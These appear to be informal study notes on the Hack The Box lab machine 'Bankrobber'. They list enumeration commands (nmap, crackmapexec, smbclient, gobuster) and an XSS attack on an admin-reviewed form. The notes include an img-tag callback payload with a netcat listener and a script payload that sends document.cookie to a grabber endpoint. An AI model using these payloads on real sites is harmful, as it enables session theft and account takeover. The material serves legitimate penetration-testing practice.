# first is nmap
nmap -sC -sV -oA nmap/bankrobber ip_address

port 80 open, 443, 3306.

## interesting things
has apache, if apache is on windows then it will have xampp installed
if its in xampp then it will be placed at C:\xampp\htdocs

whenever there is https we can look at the certificate it may have nice website

mysql is at 3306. the enumeration shows hostname to be bankrobber.
so we try and double check with crackmapexec.

apt search crackmapexec
apt install crackmapexec

crackmapexec smb ip_address. - it gives the hostname bankrobber

# checking for anonymous shared open 

smbclient -L //10.10.10.154
smbclient -N 0L //10.10.10.154


# looking at the page

the page has php extensions

so we use gobuster accordingly
`gobuster dir  -x php -u http://10.10.10.254 -w /usr/share/wordlist/dirbuster/dirbuster/directory-2.3medium.txt

# cross site scripting

whenever there is some message int he url it measn it may have cross site scripting

an image ddi not load so was looking at wether the image had any image or hsotname so that we can add to /etc/hosts

so admin will review it came. so whenever there is user interation there is cross site scripting involved

so he put a payload as 
<img src=http://10.10.14.2/PleaseSubscribe jpeg />

and then start a listener at nc -lvp 80 
so wheenever this xss works a request would be sent to the admin user

we then look at how cookies are stored, so that we can do the cross site scripting once agian

xss steal cookie payload can be ustilized
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md

<script>document.location='http://localhost/XSS/grabber.php?c='+document.cookie</script>
